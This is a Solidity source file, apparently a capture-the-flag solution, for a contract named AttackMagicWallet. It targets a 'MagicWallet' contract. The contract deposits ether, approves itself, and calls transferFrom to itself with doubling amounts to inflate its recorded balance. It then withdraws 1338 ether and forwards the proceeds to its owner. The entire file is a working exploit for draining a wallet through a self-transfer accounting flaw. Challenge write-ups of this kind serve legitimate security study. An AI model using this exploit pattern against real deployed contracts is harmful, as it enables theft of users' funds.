// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {MagicWallet} from "src/MagicWallet/MagicWallet.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IMagicWallet {
    function balances(address account) external returns (uint256);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function approve(address recipient, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

contract AttackMagicWallet is Ownable {
    address private immutable wallet;

    constructor(address _wallet) Ownable(msg.sender) {
        wallet = _wallet;
    }

    function exploit() external payable onlyOwner {
        IMagicWallet(wallet).deposit{value: msg.value}();
        IMagicWallet(wallet).approve(address(this), 1337 ether);

        IMagicWallet(wallet).transferFrom(address(this), address(this), 1 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 2 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 4 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 8 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 16 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 32 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 64 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 128 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 256 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 512 ether);
        IMagicWallet(wallet).transferFrom(address(this), address(this), 314 ether);
        IMagicWallet(wallet).withdraw(1338 ether);
    }

    receive() external payable {
        (bool success,) = owner().call{value: msg.value}("");
        require(success);
    }
}
